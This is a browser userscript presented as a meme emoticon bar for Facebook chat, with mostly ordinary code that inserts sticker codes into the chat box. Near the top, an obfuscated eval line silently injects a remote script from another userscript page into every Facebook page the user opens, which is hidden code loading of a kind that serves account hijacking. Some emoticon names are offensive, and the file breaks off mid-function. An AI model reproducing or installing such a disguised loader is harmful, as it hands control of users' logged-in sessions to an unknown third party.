// ==UserScript==
// @name			Facebook Meme Chat Emoticons Bar Plus v2
// @description	                Adds meme emoticon bar to Facebook chat
// @description	        Visit turbolego.com/L.txt.
// @description	        Report bugs at spistek@yahoo.fr
// @description	        Thank you for using my script!
// @include			http://facebook.com/*
// @include			http://*.facebook.com/*
// @include			https://facebook.com/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @include			https://*.facebook.com/*
// @exclude			http://*.channel.facebook.com/*
// @exclude			https://*.channel.facebook.com/*
// @author			spistek
// @version			2
// @versionnumber	1
// @namespace		http://userscripts.org/scripts/show/130128
// ==/UserScript==
//
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))




	var version, storage, spemotsInfo, spemotsTitle, headTag, styleTag, ArrowStyleUp, ArrowStyleDown, fEmotBarDom, fEmotsListDom, fArrow;

	version = 2;
	


	storage = 'none';

	try {
		if (typeof GM_getValue === 'function' && typeof GM_setValue === 'function') {
			GM_setValue('testkey', 'testvalue');
			if (GM_getValue('testkey', false) === 'testvalue') { storage='greasemonkey'; }
		}
	} catch(x) {}
	if (storage=='none' && typeof localStorage == 'object') { storage='localstorage'; }

	function setValue(key, value) {
		switch (storage) {
			case 'greasemonkey':
				GM_setValue('0-'+key, value);
				break;
			case 'localstorage':
				localStorage['femotbar-0-'+key] = value;
				break;
		}
	}

	function getValue(key, value) {
		switch (storage) {
			case 'greasemonkey':
				return GM_getValue('0-'+key, value);
			case 'localstorage':
				var val = localStorage['femotbar-0-'+key];
				if (val=='true') { return true; }
				else if (val=='false') { return false; }
				else if (val) { return val; }
				break;
		}
		return value;
	}
	
	function xmlhttpRequest(params, callBack) {
		if (typeof GM_xmlhttpRequest !== 'undefined') {
			params['onload'] = callBack;
			return GM_xmlhttpRequest(params);
		}
		return null;
	}

	function openInTab(url) {
		if (typeof GM_openInTab !== 'undefined') { GM_openInTab(url); }
		else { window.open(url); }
	}

	
	

	function createSelection(field, start, end) {
		if( field.createTextRange ) {
			var selRange = field.createTextRange();
			selRange.collapse(true);
			selRange.moveStart('character', start);
			selRange.moveEnd('character', end);
			selRange.select();
		} else if( field.setSelectionRange ) {
			field.setSelectionRange(start, end);
		} else if( field.selectionStart ) {
			field.selectionStart = start;
			field.selectionEnd = end;
		}
		field.focus();
	}       
	
	function getCursorPosition(field) {
		var CursorPos = 0;
		if (field.selectionStart || field.selectionStart == '0') CursorPos = field.selectionStart;
		return (CursorPos);
	}
	

	
	var mean = '[[241015455995828]][[241015459329161]][[241015465995827]][[241015452662495]][[241015462662494]]\n'+
'[[241015572662483]][[241015585995815]][[241015579329149]][[241015582662482]][[241015575995816]]\n'+
'[[241015652662475]][[241015659329141]][[241015669329140]][[241015662662474]][[241015655995808]]\n'+
'[[241015749329132]][[241015755995798]][[241015745995799]][[241015742662466]][[241015752662465]]\n'+
'[[241015959329111]][[241015989329108]][[241015965995777]][[241015962662444]][[241015985995775]]'
   var hitler = '[[364099893634444]][[364099910301109]][[364099926967774]][[364099933634440]][[364099953634438]]\n'+
'[[364099966967770]][[364099980301102]][[364099993634434]][[364100006967766]][[364100013634432]]\n'+
'[[364100023634431]][[364100033634430]][[364100050301095]][[364100070301093]][[364100086967758]]\n'+
'[[364100093634424]][[364100110301089]][[364100126967754]][[364100140301086]][[364100200301080]]\n'+
'[[364100213634412]][[364100223634411]][[364100230301077]][[364100243634409]][[364100250301075]]\n'+
'[[364100260301074]][[364100266967740]][[364100276967739]][[364100286967738]][[364100300301070]]'
  var hardcore = '[[259970010762373]][[259970014095706]][[259970017429039]][[259970024095705]][[259970020762372]][[259970154095692]][[259970167429024]]\n'+
'[[259970157429025]][[259970160762358]][[259970170762357]][[259970234095684]][[259970237429017]][[259970244095683]][[259970240762350]]\n'+
'[[259970247429016]][[259970310762343]][[259970317429009]][[259970324095675]][[259970320762342]][[259970327429008]][[259970424095665]]\n'+
'[[259970417428999]][[259970420762332]][[259970430762331]][[259970427428998]][[259970487428992]][[259970500762324]][[259970494095658]]\n'+
'[[259970490762325]][[259970497428991]][[259970574095650]][[259970577428983]][[259970584095649]][[259970587428982]][[259970580762316]]'
  var worthit = '[[239245462840234]][[239245459506901]][[239245466173567]][[239245469506900]]\n'+
'[[239245456173568]][[239245589506888]][[239245582840222]][[239245576173556]]\n'+
'[[239245586173555]][[239245579506889]][[239245659506881]][[239245666173547]]\n'+
'[[239245662840214]][[239245652840215]][[239245669506880]][[239245749506872]]\n'+
'[[239245746173539]][[239245736173540]][[239245742840206]][[239245739506873]]\n'+
'[[239245852840195]][[239245849506862]][[239245846173529]][[239245842840196]]'
  var bitchplease = '[[393242404033669]][[393242400700336]][[393242414033668]][[393242410700335]]\n'+
'[[393242407367002]][[393242547366988]][[393242560700320]][[393242557366987]]\n'+
'[[393242550700321]][[393242544033655]][[393242670700309]][[393242677366975]]\n'+
'[[393242680700308]][[393242684033641]][[393242674033642]][[393242864033623]]\n'+
'[[393242857366957]][[393242850700291]][[393242854033624]][[393242847366958]]'
  var potato = '[[355161337863812]][[355161344530478]][[355161341197145]][[355161334530479]][[355161347863811]][[355161451197134]][[355161454530467]]\n'+
'[[355161457863800]][[355161467863799]][[355161471197132]][[355161541197125]][[355161537863792]][[355161547863791]][[355161544530458]]\n'+
'[[355161551197124]][[355161637863782]][[355161634530449]][[355161641197115]][[355161624530450]][[355161627863783]][[355161741197105]]\n'+
'[[355161751197104]][[355161747863771]][[355161744530438]][[355161754530437]][[355161824530430]][[355161817863764]][[355161831197096]]\n'+
'[[355161827863763]][[355161821197097]][[355161911197088]][[355161921197087]][[355161924530420]][[355161914530421]][[355161927863753]]'
 var stopyou = '[[390771627613200]][[390771630946533]][[390771637613199]][[390771624279867]][[390771634279866]][[390771734279856]]\n'+
'[[390771737613189]][[390771747613188]][[390771744279855]][[390771740946522]][[390771807613182]][[390771824279847]]\n'+
'[[390771814279848]][[390771817613181]][[390771820946514]][[390771910946505]][[390771900946506]][[390771914279838]]\n'+
'[[390771904279839]][[390771907613172]][[390771997613163]][[390772004279829]][[390772010946495]][[390772007613162]]\n'+
'[[390772000946496]][[390772064279823]][[390772067613156]][[390772074279822]][[390772077613155]][[390772070946489]]'
 var notbad = '[[239289962835784]][[239289956169118]][[239289949502452]][[239289959502451]][[239289952835785]]\n'+
'[[239290072835773]][[239290066169107]][[239290076169106]][[239290079502439]][[239290069502440]]\n'+
'[[239290159502431]][[239290162835764]][[239290152835765]][[239290156169098]][[239290149502432]]\n'+
'[[239290249502422]][[239290252835755]][[239290236169090]][[239290239502423]][[239290246169089]]\n'+
'[[239290352835745]][[239290359502411]][[239290356169078]][[239290362835744]][[239290366169077]]'
 var badluck = '[[330214790365071]][[330214793698404]][[330214800365070]][[330214797031737]][[330214803698403]]\n'+
'[[330214907031726]][[330214910365059]][[330214903698393]][[330214900365060]][[330214897031727]]\n'+
'[[330214967031720]][[330214973698386]][[330214970365053]][[330214980365052]][[330214983698385]]\n'+
'[[330215063698377]][[330215060365044]][[330215057031711]][[330215053698378]][[330215067031710]]\n'+
'[[330215167031700]][[330215180365032]][[330215177031699]][[330215173698366]][[330215170365033]]\n'+
'[[330215250365025]][[330215243698359]][[330215253698358]][[330215247031692]][[330215257031691]]'
 var okay = '[[296238963769967]][[296238960436634]][[296238953769968]][[296238950436635]][[296238957103301]]\n'+
'[[296239070436623]][[296239077103289]][[296239073769956]][[296239080436622]][[296239083769955]]\n'+
'[[296239160436614]][[296239163769947]][[296239170436613]][[296239173769946]][[296239167103280]]\n'+
'[[296239240436606]][[296239243769939]][[296239237103273]][[296239247103272]][[296239250436605]]\n'+
'[[296239363769927]][[296239377103259]][[296239367103260]][[296239373769926]][[296239370436593]]\n'+
'[[296239473769916]][[296239463769917]][[296239460436584]][[296239467103250]][[296239470436583]]'
 var ultragay = '[[390815444275485]][[390815460942150]][[390815454275484]][[390815457608817]][[390815450942151]][[390815634275466]]\n'+
'[[390815637608799]][[390815644275465]][[390815640942132]][[390815647608798]][[390815800942116]][[390815810942115]]\n'+
'[[390815797608783]][[390815807608782]][[390815804275449]][[390815940942102]][[390815944275435]][[390815947608768]]\n'+
'[[390815954275434]][[390815950942101]][[390816090942087]][[390816080942088]][[390816094275420]][[390816084275421]]\n'+
'[[390816087608754]][[390816184275411]][[390816177608745]][[390816167608746]][[390816174275412]][[390816170942079]]\n'+
'[[390816267608736]][[390816270942069]][[390816277608735]][[390816274275402]][[390816284275401]][[390816384275391]]'
var trollface = '[[241123912651649]][[241123915984982]][[241123909318316]][[241123905984983]][[241123902651650]][[241124025984971]]\n'+
'[[241124022651638]][[241124032651637]][[241124029318304]][[241124019318305]][[241124192651621]][[241124199318287]]\n'+
'[[241124189318288]][[241124205984953]][[241124195984954]][[241124325984941]][[241124319318275]][[241124329318274]]\n'+
'[[241124335984940]][[241124345984939]][[241124559318251]][[241124572651583]][[241124565984917]][[241124562651584]]\n'+
'[[241124569318250]][[241124725984901]][[241124712651569]][[241124722651568]][[241124715984902]][[241124719318235]]\n'+
'[[241124785984895]][[241124789318228]][[241124792651561]][[241124795984894]][[241124799318227]][[241124942651546]]'
var pukingrainbows = '[[393321164025793]][[393321150692461]][[393321154025794]][[393321157359127]][[393321160692460]][[393321270692449]]\n'+
'[[393321264025783]][[393321267359116]][[393321274025782]][[393321277359115]][[393321380692438]][[393321384025771]]\n'+
'[[393321374025772]][[393321387359104]][[393321377359105]][[393321460692430]][[393321474025762]][[393321467359096]]\n'+
'[[393321464025763]][[393321470692429]][[393321577359085]][[393321584025751]][[393321587359084]][[393321574025752]]\n'+
'[[393321580692418]][[393321670692409]][[393321667359076]][[393321674025742]][[393321660692410]][[393321664025743]]'
var didthere = '[[290918420968688]][[290918017635395]][[290918024302061]][[290918027635394]][[290918030968727]][[290918117635385]][[290918124302051]]\n'+
'[[290918127635384]][[290918137635383]][[290918140968716]][[290918204302043]][[290918207635376]][[290918210968709]][[290918214302042]]\n'+
'[[290918217635375]][[290918300968700]][[290918294302034]][[290918287635368]][[290918290968701]][[290918297635367]][[290918424302021]]\n'+
'[[290918420968688]][[290918427635354]][[290918430968687]][[290918417635355]][[290918484302015]][[290918487635348]][[290918490968681]]\n'+
'[[290918494302014]][[290918497635347]][[290918600968670]][[290918597635337]][[290918587635338]][[290918594302004]][[290918590968671]]'
var motherofgod = '[[241155412648499]][[241155415981832]][[241155409315166]][[241155419315165]][[241155422648498]][[241155535981820]][[241155542648486]]\n'+
'[[241155545981819]][[241155549315152]][[241155539315153]][[241155619315145]][[241155629315144]][[241155625981811]][[241155632648477]]\n'+
'[[241155622648478]][[241155729315134]][[241155732648467]][[241155722648468]][[241155719315135]][[241155725981801]][[241155835981790]]\n'+
'[[241155839315123]][[241155825981791]][[241155829315124]][[241155832648457]][[241155922648448]][[241155909315116]][[241155905981783]]\n'+
'[[241155912648449]][[241155915981782]][[241155995981774]][[241155992648441]][[241156002648440]][[241156005981773]][[241155999315107]]'
var fuuu = '[[202651026498938]][[202651039832270]][[202651036498937]][[202651029832271]][[202651043165603]][[202651156498925]][[202651159832258]]\n'+
'[[202651166498924]][[202651163165591]][[202651153165592]][[202651223165585]][[202651236498917]][[202651233165584]][[202651226498918]]\n'+
'[[202651229832251]][[202651306498910]][[202651313165576]][[202651309832243]][[202651316498909]][[202651326498908]][[202651443165563]]\n'+
'[[202651449832229]][[202651436498897]][[202651446498896]][[202651439832230]][[202651496498891]][[202651493165558]][[202651499832224]]\n'+
'[[202651506498890]][[202651503165557]][[202651579832216]][[202651583165549]][[202651576498883]][[202651586498882]][[202651589832215]]'
var kiddingme = '[[224133361021814]][[224133351021815]][[224133347688482]][[224133357688481]][[224133354355148]]\n'+
'[[224133464355137]][[224133454355138]][[224133451021805]][[224133461021804]][[224133457688471]]\n'+
'[[224133541021796]][[224133547688462]][[224133544355129]][[224133537688463]][[224133534355130]]\n'+
'[[224133624355121]][[224133621021788]][[224133634355120]][[224133631021787]][[224133627688454]]\n'+
'[[224133717688445]][[224133714355112]][[224133724355111]][[224133711021779]][[224133721021778]]'
var fuckyou = '[[337827499603800]][[337827509603799]][[337827506270466]][[337827502937133]][[337827512937132]]\n'+
'[[337827636270453]][[337827642937119]][[337827639603786]][[337827646270452]][[337827632937120]]\n'+
'[[337827729603777]][[337827732937110]][[337827722937111]][[337827726270444]][[337827736270443]]\n'+
'[[337827799603770]][[337827796270437]][[337827802937103]][[337827792937104]][[337827806270436]]\n'+
'[[337827902937093]][[337827912937092]][[337827906270426]][[337827916270425]][[337827909603759]]'
var dickbutt = '[[337838712936012]][[337838709602679]][[337838716269345]][[337838719602678]][[337838706269346]]\n'+
'[[337838822936001]][[337838829602667]][[337838839602666]][[337838836269333]][[337838832936000]]\n'+
'[[337838936269323]][[337838929602657]][[337838942935989]][[337838939602656]][[337838932935990]]\n'+
'[[337839042935979]][[337839036269313]][[337839039602646]][[337839029602647]][[337839026269314]]\n'+
'[[337839156269301]][[337839162935967]][[337839166269300]][[337839159602634]][[337839169602633]]'
var gtfo = '[[268026366623404]][[268026373290070]][[268026369956737]][[268026376623403]][[268026383290069]][[268026483290059]]\n'+
'[[268026479956726]][[268026493290058]][[268026489956725]][[268026486623392]][[268026563290051]][[268026566623384]]\n'+
'[[268026569956717]][[268026576623383]][[268026579956716]][[268026656623375]][[268026659956708]][[268026646623376]]\n'+
'[[268026649956709]][[268026653290042]][[268026749956699]][[268026746623366]][[268026743290033]][[268026739956700]]\n'+
'[[268026736623367]][[268026833290024]][[268026819956692]][[268026826623358]][[268026829956691]][[268026823290025]]'
var reaction = '[[248735251890515]][[248735245223849]][[248735258557181]][[248735255223848]][[248735248557182]]\n'+
'[[248735351890505]][[248735358557171]][[248735355223838]][[248735365223837]][[248735361890504]]\n'+
'[[248735455223828]][[248735458557161]][[248735451890495]][[248735448557162]][[248735445223829]]\n'+
'[[248735541890486]][[248735531890487]][[248735535223820]][[248735538557153]][[248735545223819]]\n'+
'[[248735675223806]][[248735671890473]][[248735668557140]][[248735665223807]][[248735661890474]]'
var jackson = '[[224450100990140]][[224450094323474]][[224450097656807]][[224450087656808]]\n'+
'[[224450090990141]][[224450274323456]][[224450277656789]][[224450270990123]]\n'+
'[[224450267656790]][[224450264323457]][[224450347656782]][[224450350990115]]\n'+
'[[224450354323448]][[224450344323449]][[224450340990116]][[224450444323439]]\n'+
'[[224450434323440]][[224450440990106]][[224450430990107]][[224450437656773]]\n'+
'[[224450657656751]][[224450647656752]][[224450650990085]][[224450654323418]]'
var soclose = '[[268120616613979]][[268120619947312]][[268120623280645]][[268120626613978]][[268120629947311]]\n'+
'[[268120833280624]][[268120829947291]][[268120826613958]][[268120823280625]][[268120819947292]]\n'+
'[[268120923280615]][[268120913280616]][[268120916613949]][[268120909947283]][[268120919947282]]\n'+
'[[268121003280607]][[268121006613940]][[268121009947273]][[268121016613939]][[268121013280606]]\n'+
'[[268121109947263]][[268121099947264]][[268121096613931]][[268121106613930]][[268121103280597]]'
var megusta = '[[224875517614265]][[224875514280932]][[224875510947599]][[224875507614266]][[224875520947598]]\n'+
'[[224875624280921]][[224875630947587]][[224875620947588]][[224875627614254]][[224875634280920]]\n'+
'[[224875707614246]][[224875704280913]][[224875714280912]][[224875710947579]][[224875717614245]]\n'+
'[[224875790947571]][[224875784280905]][[224875780947572]][[224875797614237]][[224875777614239]]\n'+
'[[224875897614227]][[224875884280895]][[224875890947561]][[224875887614228]][[224875894280894]]'
var badass = '[[431474030212209]][[431474026878876]][[431474020212210]][[431474016878877]][[431474023545543]][[431474146878864]]\n'+
'[[431474160212196]][[431474153545530]][[431474150212197]][[431474156878863]][[431474233545522]][[431474240212188]]\n'+
'[[431474243545521]][[431474246878854]][[431474236878855]][[431474326878846]][[431474313545514]][[431474316878847]]\n'+
'[[431474320212180]][[431474323545513]][[431474443545501]][[431474440212168]][[431474430212169]][[431474436878835]]\n'+
'[[431474446878834]][[431474533545492]][[431474536878825]][[431474530212159]][[431474526878826]][[431474523545493]]'
var challenge = '[[341237112603485]][[341237119270151]][[341237115936818]][[341237109270152]][[341237122603484]][[341237225936807]]\n'+
'[[341237232603473]][[341237229270140]][[341237222603474]][[341237235936806]][[341237322603464]][[341237329270130]]\n'+
'[[341237325936797]][[341237332603463]][[341237319270131]][[341237392603457]][[341237395936790]][[341237399270123]]\n'+
'[[341237402603456]][[341237405936789]][[341237479270115]][[341237482603448]][[341237485936781]][[341237472603449]]\n'+
'[[341237475936782]][[341237552603441]][[341237555936774]][[341237559270107]][[341237562603440]][[341237565936773]]'
var no = '[[341191499274713]][[341191495941380]][[341191505941379]][[341191502608046]][[341191509274712]]\n'+
'[[341191609274702]][[341191602608036]][[341191599274703]][[341191595941370]][[341191605941369]]\n'+
'[[341191732608023]][[341191725941357]][[341191719274691]][[341191715941358]][[341191729274690]]\n'+
'[[341191912608005]][[341191902608006]][[341191929274670]][[341191895941340]][[341191925941337]]\n'+
'[[341192172607979]][[341192175941312]][[341192182607978]][[341192179274645]][[341192185941311]]\n'+
'[[341192319274631]][[341192315941298]][[341192309274632]][[341192305941299]][[341192312607965]]'
var alone = '[[203703696394411]][[203703689727745]][[203703693061078]][[203703699727744]][[203703703061077]][[203703789727735]]\n'+
'[[203703793061068]][[203703783061069]][[203703786394402]][[203703796394401]][[203703863061061]][[203703866394394]]\n'+
'[[203703856394395]][[203703853061062]][[203703859727728]][[203703926394388]][[203703923061055]][[203703919727722]]\n'+
'[[203703916394389]][[203703913061056]][[203704023061045]][[203704009727713]][[203704013061046]][[203704026394378]]\n'+
'[[203704019727712]][[203704106394370]][[203704099727704]][[203704103061037]][[203704096394371]][[203704093061038]]\n'+
'[[203704156394365]][[203704159727698]][[203704169727697]][[203704153061032]][[203704163061031]][[203704226394358]]'
var closeenough = '[[343967595659509]][[343967585659510]][[343967575659511]][[343967582326177]][[343967578992844]][[343967742326161]]\n'+
'[[343967735659495]][[343967732326162]][[343967728992829]][[343967725659496]][[343967828992819]][[343967832326152]]\n'+
'[[343967825659486]][[343967842326151]][[343967838992818]][[343967938992808]][[343967942326141]][[343967948992807]]\n'+
'[[343967945659474]][[343967952326140]][[343968082326127]][[343968092326126]][[343968098992792]][[343968102326125]]\n'+
'[[343968095659459]][[343968185659450]][[343968178992784]][[343968188992783]][[343968175659451]][[343968182326117]]'
var cerealguy = '[[402261879798388]][[402261869798389]][[402261873131722]][[402261883131721]][[402261876465055]][[402262013131708]]\n'+
'[[402262006465042]][[402262019798374]][[402262009798375]][[402262016465041]][[402262103131699]][[402262099798366]]\n'+
'[[402262096465033]][[402262106465032]][[402262109798365]][[402262173131692]][[402262183131691]][[402262176465025]]\n'+
'[[402262179798358]][[402262169798359]][[402262303131679]][[402262313131678]][[402262306465012]][[402262299798346]]\n'+
'[[402262309798345]][[402262389798337]][[402262376465005]][[402262379798338]][[402262383131671]][[402262386465004]]\n'+
'[[402262466464996]][[402262473131662]][[402262459798330]][[402262469798329]][[402262463131663]][[402262529798323]]'
var gurugamesh = '[[224961354272348]][[224961357605681]][[224961344272349]][[224961347605682]][[224961350939015]][[224961480939002]]\n'+
'[[224961494272334]][[224961490939001]][[224961487605668]][[224961484272335]][[224961564272327]][[224961570938993]]\n'+
'[[224961560938994]][[224961557605661]][[224961567605660]][[224961637605653]][[224961640938986]][[224961644272319]]\n'+
'[[224961650938985]][[224961647605652]][[224961730938977]][[224961737605643]][[224961727605644]][[224961724272311]]\n'+
'[[224961734272310]][[224961827605634]][[224961814272302]][[224961820938968]][[224961817605635]][[224961824272301]]'
var download = 'download V1 from http://userscripts.org/scripts/show/129125 and V2 from:http://userscripts.org/scripts/show/130128 And Download The New Emojis Extension From : http://userscripts.org/scripts/show/145630'
 	spemotsInfo = [mean, 'http://graph.facebook.com/364837310227369/picture', hitler, 'http://graph.facebook.com/364837346894032/picture', hardcore, 'http://graph.facebook.com/364838190227281/picture', worthit, 'http://graph.facebook.com/364842106893556/picture', bitchplease, 'http://graph.facebook.com/364837326894034/picture', potato, 'http://graph.facebook.com/364841996893567/picture', stopyou, 'http://graph.facebook.com/364838220227278/picture', notbad, 'http://graph.facebook.com/364838216893945/picture', badluck, 'http://graph.facebook.com/364837320227368/picture', okay, 'http://graph.facebook.com/364838226893944/picture', ultragay, 'http://graph.facebook.com/364842060226894/picture', trollface, 'http://graph.facebook.com/364842046893562/picture', pukingrainbows, 'http://graph.facebook.com/364842030226897/picture', didthere, 'http://graph.facebook.com/365368090174291/picture', motherofgod, 'http://graph.facebook.com/364838210227279/picture', fuuu, 'http://graph.facebook.com/365348903509543/picture', kiddingme, 'https://graph.facebook.com/370699836307783/picture', fuckyou, 'https://graph.facebook.com/370700066307760/picture', dickbutt, 'https://graph.facebook.com/370699962974437/picture', gtfo, 'http://graph.facebook.com/370700082974425/picture', reaction, 'http://graph.facebook.com/370699872974446/picture', jackson, 'http://graph.facebook.com/370699842974449/picture', soclose, 'http://graph.facebook.com/370700012974432/picture', megusta, 'http://graph.facebook.com/370699802974453/picture', badass, 'http://graph.facebook.com/370700169641083/picture', challenge, 'https://graph.facebook.com/370699906307776/picture', no, 'https://graph.facebook.com/370700192974414/picture', alone, 'https://graph.facebook.com/370700209641079/picture', closeenough, 'https://graph.facebook.com/370699936307773/picture', cerealguy, 'http://graph.facebook.com/370699892974444/picture', gurugamesh, 'http://graph.facebook.com/370700132974420/picture', download, 'http://graph.facebook.com/365379453506488/picture'];
    spemotsTitle = ['mean', ' ', 'hitler', ' ','hardcore', ' ','worthit', ' ', 'bitchplease', ' ','potato', ' ','stopyou', ' ','notbad', ' ','badluck', ' ','okay', ' ','ultragay', ' ','trollface',' ','pukingrainbows',' ','didthere',' ','motherofgod',' ','fuuu',' ','kiddingme',' ','fuckyou',' ','dickbutt',' ','gtfo',' ','reaction',' ','jackson',' ','soclose',' ','megusta',' ','badass',' ','challenge',' ','no',' ','alone',' ','closeenough',' ','cerealguy',' ','gurugamesh'];
    headTag = document.getElementsByTagName('head')[0];
    if (headTag) {
		styleTag = document.createElement('style');
		styleTag.type = 'text/css';
		styleTag.innerHTML =
			'.chat_tab_emot_bar {padding-top: 2px; padding-bottom: 6px; line-height: 16px; padding-left: 2px; background:#EEEEEE none repeat scroll 0 0; border-style: solid; border-width: 0px 0px 1px 0px; border-color: #C9D0DA; position: static; }'+
			'.fbNubFlyoutInner {position:relative !important;bottom:0px !important;}' +
			'.chat_arrow { background-image: url("http://static.ak.fbcdn.net/rsrc.php/v1/zp/r/SBNTDM0S-7U.png"); background-position: 0 -48px; height: 5px; width: 9px; }';
		headTag.appendChild(styleTag);
	}
	
	ArrowStyleUp = 'cursor: pointer; position: absolute; right: 2px; -moz-transform: rotate(180deg); -webkit-transform: rotate(180deg);'
	ArrowStyleDown = 'cursor: pointer; position: absolute; right: 2px;'
	
	fEmotBarDom = document.createElement('div');
	fEmotBarDom.setAttribute('class','chat_tab_emot_bar');

	
	fEmotsListDom = document.createElement('div');
	fEmotsListDom.setAttribute('name','EmotsList');
	fEmotBarDom.appendChild(fEmotsListDom);
	
	
	for(i=0;i<spemotsInfo.length;i+=2) {
		var fEmotsDom = document.createElement('img');
		fEmotsDom.setAttribute('alt',spemotsInfo[i]);
		fEmotsDom.setAttribute('title',spemotsTitle[i]);
		fEmotsDom.setAttribute('src','' + spemotsInfo[i+1]);
		fEmotsDom.setAttribute('style','cursor: pointer;');
		fEmotsDom.setAttribute('class','emote_custom');
		fEmotsListDom.appendChild(fEmotsDom);
	}
	
	

	fArrow = document.createElement('i');
	fArrow.setAttribute('alt','');
	fArrow.setAttribute('class','img chat_arrow');
	fArrow.setAttribute('style',ArrowStyleUp);
	fEmotBarDom.appendChild(fArrow);
	
	var setting_visible = getValue('visible',true);
	
	document.addEventListener('DOMNodeInserted', fInsertedNodeHandler, false);

	function fInsertedNodeHandler(event) {
		if(event.target.getElementsByClassName && event.target.getElementsByClassName('fbNubFlyout fbDockChatTabFlyout')[0])
			fInsertEmotBar(event.target);
	}

	function fInsertEmotBar(fChatWrapper) {
		fChatToolBox = fChatWrapper.getElementsByClassName('fbNubFlyoutHeader')[0]
		fNewEmotBar = fEmotBarDom.cloneNode(true);
		setVisibility(fNewEmotBar);
		for(i=0;i<fNewEmotBar.firstChild.childNodes.length-2;i++) fNewEmotBar.firstChild.childNodes[i].addEventListener('click', fEmotClickHandler , false);

		fNewEmotBar.firstChild.childNodes[i].addEventListener('click' , fStyleClickHandler , false);
		fNewEmotBar.firstChild.childNodes[i+1].addEventListener('click' , fStyleClickHandler , false);
		
		fNewEmotBar.childNodes[1].addEventListener('click', fHideShowEmotBar , false);
		if(fChatToolBox.childNodes) fChatToolBox.insertBefore(fNewEmotBar,fChatToolBox.childNodes[1]);
	}

	function fEmotClickHandler(event){
		var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];
		var pos = getCursorPosition(fChatInput);
		
		var txtbef = ''; var txtaft = '';
		
		if (fChatInput.value.charAt(pos-1) != ' ' && pos-1 > 0) txtbef = ' ';
		if (fChatInput.value.charAt(pos) != ' ') txtaft = ' ';
		
		fChatInput.value = fChatInput.value.substring(0,pos) + txtbef + event.target.getAttribute('alt') + txtaft + fChatInput.value.substring(pos);
		createSelection(fChatInput,pos + event.target.getAttribute('alt').length + txtaft.length + txtbef.length,pos + event.target.getAttribute('alt').length + txtaft.length + txtbef.length);
	}
	
	function fStyleClickHandler(event){
		var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];
		
		var selectedText = fChatInput.value.substring(fChatInput.selectionStart, fChatInput.selectionEnd);
		
		var pos = getCursorPosition(fChatInput);
		var txtlen = selectedText.length;
		
		if (txtlen == 0) {
			fChatInput.value = fChatInput.value.substring(0,pos) + event.target.getAttribute('alt') + fChatInput.value.substring(pos);
			createSelection(fChatInput,pos + 1,pos + event.target.getAttribute('alt').length-1);
		}
		else {
			var txtbef = event.target.getAttribute('alt').charAt(0);
			var txtaft = event.target.getAttribute('alt').charAt(0);
			
			while (fChatInput.value.charAt(pos) == ' ') { pos += 1; txtlen -= 1; }
			while (fChatInput.value.charAt(pos+txtlen-1) == ' ') txtlen -= 1;
			
			if (fChatInput.value.charAt(pos-1) != ' ' && pos-1 > 0) txtbef = ' ' + txtbef;
			if (fChatInput.value.charAt(pos+txtlen) != ' ') txtaft += ' ';
			
			fChatInput.value = fChatInput.value.substring(0,pos) + txtbef + fChatInput.value.substring(pos,pos+txtlen) + txtaft + fChatInput.value.substring(pos + txtlen);
			
			createSelection(fChatInput, pos + txtlen + 2, pos + txtlen + 2);
		}
	}

	function fHideShowEmotBar(event){
		fChatBar = document.getElementsByName('EmotsList');
		if(fChatBar[0].getAttribute('style') == 'display: none;') {
			for(i=0;i<fChatBar.length;i++) {
				fChatBar[i].setAttribute('style','display: block;');
				fChatBar[i].parentNode.childNodes[1].setAttribute('style',ArrowStyleUp);
			}
		}
		else {
			for(i=0;i<fChatBar.length;i++) {
				fChatBar[i].setAttribute('style','display: none;');
				fChatBar[i].parentNode.childNodes[1].setAttribute('style',ArrowStyleDown);
			}
		}
		setValue('visible',!setting_visible);
		setting_visible = !setting_visible;
	}
	
	function setVisibility(DOM) {
		if(setting_visible) {
			DOM.firstChild.setAttribute('style','display: block;');
			DOM.childNodes[1].setAttribute('style',ArrowStyleUp);
		}
		else {
			DOM.firstChild.setAttribute('style','display: none;');
			DOM.childNodes[1].setAttribute('style',ArrowStyleDown);
		}
	}


shortcut = {
	'all_shortcuts':{},
	'add': function(shortcut_combination,callback,opt) {
	
		var default_options = {
			'type':'keydown',
			'propagate':false,
			'disable_in_input':false,
			'target':document,
			'keycode':false
		}
		if(!opt) opt = default_options;
		else {
			for(var dfo in default_options) {
				if(typeof opt[dfo] == 'undefined') opt[dfo] = default_options[dfo];
			}
		}

		var ele = opt.target;
		if(typeof opt.target == 'string') ele = document.getElementById(opt.target);
		var ths = this;
		shortcut_combination = shortcut_combination.toLowerCase();


		var func = function(e) {
			e = e || window.event;
			
	
			
			if (e.keyCode) code = e.keyCode;
			else if (e.which) code = e.which;
			var character = String.fromCharCode(code).toLowerCase();
			
			if(code == 188) character=","; 

			var keys = shortcut_combination.split("+");
		
			var kp = 0;
			
			var shift_nums = {
				"`":"~",
				"1":"!",
				"2":"@",
				"3":"#",
				"4":"$",
				"5":"%",
				"6":"^",
				"7":"&",
				"8":"*",
				"9":"(",
				"0":")",
				"-":"_",
				"=":"+",
				";":":",
				"'":"\"",
				",":"<",
				".":">",
				"/":"?",
				"\\":"|"
			}
		
			var special_keys = {
				'esc':27,
				'escape':27,
				'tab':9,
				'space':32,
				'return':13,
				'enter':13,
				'backspace':8,
	
				'scrolllock':145,
				'scroll_lock':145,
				'scroll':145,
				'capslock':20,
				'caps_lock':20,
				'caps':20,
				'numlock':144,
				'num_lock':144,
				'num':144,
				
				'pause':19,
				'break':19,
				
				'insert':45,
				'home':36,
				'delete':46,
				'end':35,
				
				'pageup':33,
				'page_up':33,
				'pu':33,
	
				'pagedown':34,
				'page_down':34,
				'pd':34,
	
				'left':37,
				'up':38,
